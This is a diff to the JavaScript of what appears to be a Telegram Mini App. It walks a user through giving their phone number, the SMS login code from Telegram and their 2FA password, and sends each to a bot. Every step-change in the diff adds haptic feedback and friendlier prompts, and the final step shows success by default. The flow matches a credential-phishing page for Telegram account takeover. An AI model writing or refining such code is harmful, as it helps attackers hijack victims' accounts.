@@ -14,7 +14,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const successMsg = document.getElementById('successMsg');
     const errorMsg = document.getElementById('errorMsg');
 
-    let currentStep = 'contact';  // Шаги: contact, code, 2fa
+    let currentStep = 'contact';  // Шаги: contact, phone, code, 2fa
 
     loginBtn.addEventListener('click', () => {
         loginBtn.style.opacity = '0';
@@ -34,6 +34,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     submitBtn.textContent = 'Отправить номер';
                     statusMsg.textContent = 'Номер получен. Отправляем...';
                     currentStep = 'phone';
+                    tg.HapticFeedback.impactOccurred('light');
                 } else {
                     throw new Error('Contact denied');
                 }
@@ -56,15 +57,16 @@ document.addEventListener('DOMContentLoaded', () => {
             tg.sendData(JSON.stringify(payload));
             showLoading();
             statusMsg.textContent = 'Отправляем номер боту...';
-            // Переход к следующему шагу после отправки
+            tg.HapticFeedback.notificationOccurred('success');
+            // Переход к следующему шагу
             setTimeout(() => {
                 hideLoading();
                 phoneInput.classList.add('hidden');
                 codeInput.classList.remove('hidden');
                 submitBtn.textContent = 'Отправить код';
-                statusMsg.textContent = 'Введите SMS-код из Telegram.';
+                statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат для подтверждения).';
                 currentStep = 'code';
-            }, 1500);  // Короткая задержка для UX
+            }, 1500);
             return;
         }
 
@@ -79,6 +81,7 @@ document.addEventListener('DOMContentLoaded', () => {
             tg.sendData(JSON.stringify(payload));
             showLoading();
             statusMsg.textContent = 'Проверяем код...';
+            tg.HapticFeedback.impactOccurred('medium');
             // Переход к 2FA
             setTimeout(() => {
                 hideLoading();
@@ -87,7 +90,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 submitBtn.textContent = 'Подтвердить 2FA';
                 statusMsg.textContent = 'Если 2FA настроен, введите пароль (иначе оставьте пустым).';
                 currentStep = '2fa';
-            }, 2000);  // Задержка для обработки бота
+            }, 2000);
             return;
         }
 
@@ -97,7 +100,8 @@ document.addEventListener('DOMContentLoaded', () => {
             tg.sendData(JSON.stringify(payload));
             showLoading();
             statusMsg.textContent = 'Подтверждаем 2FA...';
-            // Показываем success по умолчанию (бот уточнит в чате)
+            tg.HapticFeedback.impactOccurred('heavy');
+            // Показываем success (бот уточнит в чате)
             setTimeout(() => {
                 hideLoading();
                 successMsg.classList.remove('hidden');
@@ -112,12 +116,12 @@ document.addEventListener('DOMContentLoaded', () => {
     function showLoading() {
         loadingSpinner.classList.remove('hidden');
         submitBtn.disabled = true;
+        errorMsg.classList.add('hidden');
     }
 
     function hideLoading() {
         loadingSpinner.classList.add('hidden');
         submitBtn.disabled = false;
-        errorMsg.classList.add('hidden');
     }
 
     function resetForm() {
@@ -130,9 +134,11 @@ document.addEventListener('DOMContentLoaded', () => {
         codeInput.value = '';
         twoFaInput.value = '';
         successMsg.classList.add('hidden');
+        errorMsg.classList.add('hidden');
+        statusMsg.textContent = '';
     }
 
-    // Событие после отправки данных (опционально для haptic)
+    // Событие после отправки данных
     tg.onEvent('webAppDataSent', () => {
         tg.HapticFeedback.impactOccurred('light');
     });
